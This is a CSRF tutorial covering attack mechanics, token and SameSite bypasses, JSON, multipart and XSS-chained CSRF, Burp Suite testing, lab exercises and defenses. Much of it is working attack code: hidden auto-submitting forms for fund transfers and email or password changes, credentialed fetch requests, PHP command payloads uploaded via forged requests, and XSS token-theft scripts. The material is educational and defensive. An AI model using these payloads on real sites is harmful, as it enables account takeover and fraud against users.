# CSRF Attack Guide: Cross-Site Request Forgery

## Introduction and Objectives

Cross-Site Request Forgery (CSRF) is an attack class that forces an authenticated victim's browser to send forged HTTP requests to a vulnerable web application. Unlike Cross-Site Scripting (XSS), CSRF does not require the attacker to inject client-side scripts. Instead, it exploits the trust that a web application places in the user's browser by leveraging the automatic inclusion of credentials (cookies, HTTP Basic auth, client-side certificates) with every request to a given origin.

When a user is authenticated to a target application, their browser attaches session cookies to every request sent to that application regardless of which site originated the request. An attacker who can lure the victim to a page under their control can embed hidden forms, images, or JavaScript that silently submit requests to the target application. If the application relies solely on cookies for authentication and performs state-changing operations via GET or simple POST requests, the forged request succeeds and the action is executed with the victim's privileges.

**Learning Objectives:**

- Understand the mechanics of CSRF attacks across multiple request types and content formats
- Identify and exploit common CSRF token validation weaknesses
- Master SameSite cookie attribute exploitation scenarios
- Perform CSRF against JSON-based and multipart endpoints
- Chain CSRF with XSS for maximum impact
- Automate CSRF vulnerability discovery using Burp Suite
- Implement and verify robust CSRF defenses

**Prerequisites:**

- Familiarity with HTTP methods, headers, and cookie mechanics
- Basic understanding of web application session management
- Burp Suite Professional or Community Edition installed
- A vulnerable practice application (DVWA, OWASP WebGoat, or PortSwigger labs)

## Understanding CSRF Mechanics

### How CSRF Works

A standard CSRF attack follows this flow:

1. The victim authenticates to the target application and receives a session cookie
2. The attacker crafts a malicious page that submits a request to the target
3. The victim visits the attacker's page while still authenticated
4. The victim's browser sends the forged request with the session cookie attached
5. The target application processes the request as if the victim initiated it

### GET-Based CSRF

The simplest CSRF vector exploits GET requests that perform state-changing operations. Consider an application that changes a user's email via a GET request:

```
GET /account/email?email=attacker@evil.com HTTP/1.1
Host: targetapp.com
Cookie: session=a3Fh9xKl...
```

An attacker can trigger this with a simple image tag:

```html
<img src="https://targetapp.com/account/email?email=attacker@evil.com" alt="loader" style="display:none">
```

Or a link disguised as something innocuous:

```html
<a href="https://targetapp.com/account/email?email=attacker@evil.com">Click here for a prize!</a>
```

### POST-Based CSRF

When state changes require POST requests, the attacker uses a hidden HTML form with JavaScript to auto-submit:

```html
<html>
<body>
  <form id="csrf-form" method="POST" action="https://targetapp.com/account/transfer" style="display:none">
    <input type="hidden" name="recipient" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

The browser automatically attaches the victim's cookies to this cross-origin POST request. The standard HTML form submission cannot set custom headers like `X-Requested-With`, which provides a partial defense -- but only if the server actually validates that header.

## CSRF Token Bypass Techniques

### Token Not Validated on Server

Some applications generate CSRF tokens but never validate them on the server side. Test this by removing the token parameter entirely:

```http
POST /account/password HTTP/1.1
Host: targetapp.com
Cookie: session=a3Fh9xKl...
Content-Type: application/x-www-form-urlencoded

new_password=Pwned123!
```

If the request succeeds without the token, the application is vulnerable. Also test by submitting a random token value -- some implementations only check for the presence of a token parameter, not its correctness.

### Token Tied to Non-Session Cookie

Some frameworks decouple the CSRF token cookie from the session cookie. If the application uses a double-submit cookie pattern but the CSRF token cookie is not cryptographically tied to the session, an attacker can set their own CSRF cookie via a subdomain or header injection:

```http
POST /account/email HTTP/1.1
Host: targetapp.com
Cookie: session=a3Fh9xKl...; csrf_token=ATTACKER_CONTROLLED_VALUE
Content-Type: application/x-www-form-urlencoded

csrf_token=ATTACKER_CONTROLLED_VALUE&email=attacker@evil.com
```

If the server only checks that the cookie value matches the form value without verifying authenticity, the protection is bypassed.

### Token Validation Depends on Request Method

Some applications validate CSRF tokens only for POST requests but not for other HTTP methods. Test PUT, PATCH, and DELETE:

```http
PUT /account/email HTTP/1.1
Host: targetapp.com
Cookie: session=a3Fh9xKl...
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

If the PUT request succeeds without a token, the CSRF protection is incomplete.

### Token Copied from Another Session

If CSRF tokens are not tied to a specific session, you may be able to use a token from your own authenticated session in a forged request targeting another user. Obtain a valid token from your session and embed it in the CSRF exploit:

```html
<form id="csrf-form" method="POST" action="https://targetapp.com/account/transfer">
  <input type="hidden" name="csrf_token" value="VALID_TOKEN_FROM_OWN_SESSION">
  <input type="hidden" name="recipient" value="attacker_account">
  <input type="hidden" name="amount" value="5000">
</form>
```

### Referrer-Based Token Validation Bypass

Some applications validate the token only when the Referer header is present. Remove the Referer header entirely using a meta tag:

```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://targetapp.com/account/transfer">
  <input type="hidden" name="recipient" value="attacker_account">
  <input type="hidden" name="amount" value="5000">
</form>
```

If the server skips token validation when Referer is absent, the attack succeeds.

## SameSite Cookie Exploitation

### Understanding SameSite Attribute

The `SameSite` cookie attribute controls whether cookies are sent with cross-site requests. The attribute has three possible values:

- **`Strict`**: Cookies are only sent with same-site requests. Provides strong CSRF protection but breaks top-level navigation (e.g., following an external link to the application requires re-authentication).
- **`Lax`**: Cookies are sent with same-site requests and top-level GET navigation from external sites. The default in modern browsers. Blocks cross-site POST requests but allows cross-site top-level GET navigation.
- **`None`**: Cookies are sent with all requests including cross-site. Requires the `Secure` attribute (HTTPS only). Provides no CSRF protection by itself.

### Exploiting Lax SameSite with Top-Level Navigation

When cookies use `SameSite=Lax`, cross-site POST requests do not include cookies. However, cross-site top-level GET navigation does include them. If the application performs state changes via GET requests, CSRF remains exploitable:

```html
<script>
  window.open('https://targetapp.com/account/transfer?recipient=attacker&amount=5000', '_blank');
</script>
```

Alternatively, use a meta refresh redirect:

```html
<meta http-equiv="refresh" content="0;url=https://targetapp.com/account/transfer?recipient=attacker&amount=5000">
```

### Exploiting SameSite=Lax Within 2 Minutes

Chrome implements a two-minute grace period for Lax cookies. When a cookie is newly set (or refreshed), it is temporarily treated as `SameSite=None` for the first 120 seconds. If an attacker can trigger cookie renewal shortly before the CSRF attack, the Lax restriction is bypassed even for POST requests:

1. Lure the victim to a page that issues a same-site request to the target, refreshing the session cookie
2. Immediately submit the CSRF form

```html
<!-- Step 1: Refresh the cookie -->
<img src="https://targetapp.com/any-endpoint" style="display:none">
<!-- Step 2: Submit the CSRF form within 2 minutes -->
<form id="csrf-form" method="POST" action="https://targetapp.com/account/transfer">
  <input type="hidden" name="recipient" value="attacker_account">
  <input type="hidden" name="amount" value="5000">
</form>
<script>
  setTimeout(function() {
    document.getElementById('csrf-form').submit();
  }, 1000);
</script>
```

### Missing SameSite Attribute

If the cookie has no `SameSite` attribute, modern browsers default to `Lax`. However, older browsers treat the absence as `None`. Check the target's user-agent requirements -- if the application supports legacy browsers, cookies without `SameSite` may be sent with all cross-site requests.

## JSON-Based CSRF

Many modern applications use JSON APIs that expect a `Content-Type: application/json` header. Standard HTML forms cannot set this content type, which provides a partial defense. However, several bypass techniques exist.

### CSRF via Flash and Cross-Origin Resource Sharing

Older versions of Flash allowed setting arbitrary Content-Type headers on cross-origin requests. This vector is largely obsolete but may still apply to legacy systems with Flash enabled.

### JSON CSRF with Text/Plain Content Type

Some JSON parsers accept malformed JSON or process input regardless of the Content-Type header. Test whether the application accepts a POST with `Content-Type: text/plain`:

```html
<form id="csrf-form" method="POST" action="https://targetapp.com/api/transfer" enctype="text/plain">
  <input type="hidden" name='{"recipient":"attacker_account","amount":5000,"ignore":"' value='"}'>
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

This produces a request body like:

```
{"recipient":"attacker_account","amount":5000,"ignore":"="}
```

The extra `ignore` field is ignored by most JSON parsers (they typically process the first occurrence or silently ignore unrecognized fields).

### CSRF via XMLHttpRequest with CORS Misconfiguration

If the application has a permissive CORS configuration (e.g., `Access-Control-Allow-Origin: *` or reflects the `Origin` header without validation), an attacker can use JavaScript `fetch` or `XMLHttpRequest` to send JSON requests with custom headers:

```javascript
fetch('https://targetapp.com/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  credentials: 'include',
  body: JSON.stringify({
    recipient: 'attacker_account',
    amount: 5000
  })
});
```

This only works if the server responds to preflight (OPTIONS) requests with permissive CORS headers that allow the attacker's origin.

## Multipart CSRF

File upload endpoints that accept `multipart/form-data` are exploitable via CSRF using standard HTML forms with `enctype="multipart/form-data"`:

```html
<form id="csrf-form" method="POST" action="https://targetapp.com/api/avatar/upload"
      enctype="multipart/form-data">
  <input type="hidden" name="avatar" value="<?php system('id'); ?>">
  <input type="file" name="file">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

For automated file content injection, use JavaScript to construct the FormData:

```javascript
var formData = new FormData();
var blob = new Blob(['<?php system("cat /etc/passwd"); ?>'], {type: 'image/jpeg'});
formData.append('file', blob, 'avatar.php');
formData.append('type', 'profile');

fetch('https://targetapp.com/api/avatar/upload', {
  method: 'POST',
  credentials: 'include',
  body: formData
});
```

This technique works when the server does not validate CSRF tokens for multipart requests or when the CORS policy allows cross-origin multipart submissions.

## CSRF via XSS

Cross-Site Scripting provides the most powerful CSRF bypass. An XSS vulnerability within the same origin can read CSRF tokens from the page DOM and include them in forged requests:

```javascript
// Steal the CSRF token from a meta tag
var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

// Send a forged request with the valid token
fetch('/account/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'recipient=attacker_account&amount=50000&csrf_token=' + csrfToken
});
```

Or extract the token from a form field:

```javascript
var csrfToken = document.querySelector('input[name="csrf_token"]').value;

var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/email', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com&csrf_token=' + encodeURIComponent(csrfToken));
```

XSS defeats all token-based CSRF protections because the XSS payload runs within the same origin and has access to the DOM, cookies, and JavaScript context of the authenticated session. This is one reason why XSS is considered a critical vulnerability even when CSRF protections are in place.

## Automated CSRF Testing with Burp Suite

### Using Burp Scanner

Burp Suite Professional includes automated CSRF scanning. Navigate to the target application through Burp's proxy and let the passive scanner identify potential CSRF vulnerabilities. The scanner checks for:

- Missing CSRF tokens in state-changing requests
- Tokens that are not tied to the session
- Predictable or static token values

### Manual CSRF Testing with Burp

Use Burp Repeater and Intruder for manual testing:

**Step 1: Identify state-changing requests.** Look through Burp Proxy's HTTP history for POST, PUT, PATCH, and DELETE requests that modify data.

**Step 2: Generate a CSRF PoC.** Right-click on a request and select "Engagement tools > Generate CSRF PoC." Burp creates an HTML page that submits the request:

```html
<html>
  <body>
    <form method="POST" action="https://targetapp.com/account/transfer">
      <input type="hidden" name="recipient" value="victim_account">
      <input type="hidden" name="amount" value="100">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Step 3: Modify and test.** Edit the generated PoC to remove or modify the CSRF token. Host it on a local server and test with an authenticated session.

### Using Burp Extensions

Install the following extensions from the BApp Store:

- **CSRF Scanner**: Enhanced CSRF detection with token analysis
- **CSRF PoC Generator**: Improved PoC generation for complex request types
- **Token Tester**: Analyzes token randomness and predictability

### Automated CSRF Token Analysis

Use Burp Sequencer to analyze the randomness of CSRF tokens:

1. Capture a response containing a CSRF token
2. Right-click the token value and select "Send to Sequencer"
3. Configure the token location and character set
4. Run the analysis to check for patterns, predictability, or insufficient entropy

## Hands-On Practice and Exercises

### Exercise 1: Basic GET-Based CSRF

**Objective**: Exploit a GET-based state change in a vulnerable application.

**Setup**: Configure DVWA with security set to "low." Navigate to the "User Management" section.

**Steps**:
1. Authenticate to DVWA as an admin user
2. Identify a GET request that changes user privileges: `GET /dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change`
3. Craft an HTML page with a hidden image tag pointing to this URL
4. Open the HTML page while still authenticated to DVWA
5. Verify that the password was changed

**Expected Result**: The victim's password is changed without their knowledge.

### Exercise 2: POST-Based CSRF with Token Bypass

**Objective**: Exploit a POST-based form by removing the CSRF token.

**Setup**: Use OWASP WebGoat's CSRF lesson.

**Steps**:
1. Capture a legitimate POST request with Burp Proxy
2. Note the CSRF token parameter
3. Forward the request to Burp Repeater
4. Remove the CSRF token parameter and send the request
5. Observe whether the action succeeds
6. If successful, generate a CSRF PoC using Burp

**Expected Result**: Understanding of when token validation is absent or weak.

### Exercise 3: JSON CSRF with CORS Misconfiguration

**Objective**: Perform CSRF against a JSON API endpoint using a CORS misconfiguration.

**Setup**: Use a vulnerable API that reflects the Origin header.

**Steps**:
1. Identify a JSON POST endpoint that performs state changes
2. Check CORS headers by sending an OPTIONS request with a custom Origin
3. If `Access-Control-Allow-Origin` reflects the Origin and `Access-Control-Allow-Credentials: true` is set, craft a JavaScript exploit
4. Host the exploit on the attacker domain
5. Execute the exploit from an authenticated session

**Expected Result**: The JSON API accepts the cross-origin forged request.

### Exercise 4: CSRF via XSS Token Theft

**Objective**: Chain an XSS vulnerability with CSRF to bypass token protection.

**Setup**: Use a vulnerable application with both XSS and CSRF token protection.

**Steps**:
1. Identify a reflected or stored XSS vulnerability
2. Write a JavaScript payload that extracts the CSRF token from the page
3. Use the extracted token to submit a forged request
4. Encode the payload and inject it via the XSS vector
5. Verify the forged request succeeds

**Expected Result**: The XSS payload reads the token and performs a state change, fully bypassing CSRF protection.

### Exercise 5: Comprehensive CSRF Assessment

**Objective**: Perform a full CSRF assessment on a practice application.

**Setup**: Use the PortSwigger CSRF labs (lab.security).

**Steps**:
1. Map all state-changing endpoints (POST, PUT, DELETE)
2. For each endpoint, check: token presence, token validation, token-session binding
3. Check SameSite cookie attributes
4. Test for CORS misconfigurations that enable JSON CSRF
5. Document all findings with PoC exploits
6. Recommend remediation for each vulnerability

**Expected Result**: A complete CSRF assessment report with identified vulnerabilities and remediation guidance.

## Defense Mechanisms

### Synchronizer Token Pattern

The most robust CSRF defense. The server generates a cryptographically random token, stores it in the server-side session, and embeds it in every form as a hidden field. On submission, the server compares the submitted token with the stored session token:

```
Server-side (pseudocode):
session.csrf_token = generate_random_token(256 bits)
```

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="${session.csrf_token}">
  ...
</form>
```

Requirements for secure implementation:
- Token must have sufficient entropy (minimum 256 bits)
- Token must be tied to the specific user session
- Token must be validated on every state-changing request
- Token should be regenerated after authentication

### Double Submit Cookie Pattern

The server sets a CSRF token in both a cookie and a form field. On submission, the server verifies that both values match:

```http
Set-Cookie: csrf_token=R4nd0mT0k3nV4lu3; Path=/; Secure; HttpOnly; SameSite=Strict
```

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="R4nd0mT0k3nV4lu3">
  ...
</form>
```

This pattern is stateless but vulnerable to attacks where the attacker can set cookies on the target domain (subdomain takeover, header injection).

### SameSite Cookie Attribute

Set `SameSite=Strict` or `SameSite=Lax` on all session cookies:

```http
Set-Cookie: session=a3Fh9xKl; Path=/; Secure; HttpOnly; SameSite=Strict
```

- Use `Strict` for internal applications where external link navigation is not needed
- Use `Lax` for public-facing applications (recommended default)
- Never use `SameSite=None` unless the cookie is not security-sensitive
- Always combine `SameSite` with token-based defenses for defense-in-depth

### Origin and Referer Header Validation

Verify the `Origin` or `Referer` header on state-changing requests:

```
Server-side validation (pseudocode):
origin = request.headers.get('Origin')
if origin not in ALLOWED_ORIGINS:
    reject_request()
```

Limitations:
- Some browsers or privacy tools strip these headers
- The `Origin` header is not sent on same-origin requests in some contexts
- Should be used as a supplementary defense, not the sole protection

### Custom Request Headers

Require a custom header (e.g., `X-Requested-With`) on state-changing requests. Standard HTML forms cannot set custom headers:

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});
```

This is effective against basic CSRF but does not protect against XSS-based attacks or CORS-misconfigured endpoints.

## References and Resources

### Standards and Specifications

- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **RFC 6265 - HTTP State Management Mechanism**: https://datatracker.ietf.org/doc/html/rfc6265
- **RFC 6454 - The Web Origin Concept**: https://datatracker.ietf.org/doc/html/rfc6454
- **MDN: SameSite Cookies**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

### Tools

- **Burp Suite Professional**: Automated CSRF scanning and PoC generation (https://portswigger.net/burp)
- **OWASP ZAP**: Open-source CSRF detection (https://www.zaproxy.org/)
- **CSRF PoC Generator**: Online tool for crafting CSRF exploits (https://csrf-poc-generator.herokuapp.com/)
- **Browser Developer Tools**: Network tab for analyzing cookie attributes and request headers

### Practice Labs

- **PortSwigger Web Security Academy - CSRF**: https://portswigger.net/web-security/csrf
- **OWASP WebGoat**: CSRF lessons with progressive difficulty (https://owasp.org/www-project-webgoat/)
- **DVWA (Damn Vulnerable Web Application)**: CSRF module at various security levels (https://github.com/digininja/DVWA)
- **TryHackMe - CSRF Room**: https://tryhackme.com/

### Books and Research Papers

- **The Web Application Hacker's Handbook** by Dafydd Stuttard and Marcus Pinto - Chapter on CSRF attacks and defenses
- **OWASP Testing Guide v4 - CSRF Testing**: https://owasp.org/www-project-web-security-testing-guide/
- **Browser Security Whitepaper**: Google Chrome's SameSite cookie implementation details
- **Barth, Jackson, and Mitchell (2008)**: "Robust Defenses for Cross-Site Request Forgery" - Foundational CSRF research paper

### Additional Reading

- **Chrome SameSite Updates**: https://www.chromium.org/updates/same-site
- **PortSwigger Research - Bypassing SameSite Restrictions**: https://portswigger.net/research
- **HackerOne Hacktivity**: Search for CSRF-related disclosed reports for real-world examples
- ** Cure53 Browser Security Research**: Cross-browser CSRF behavior analysis
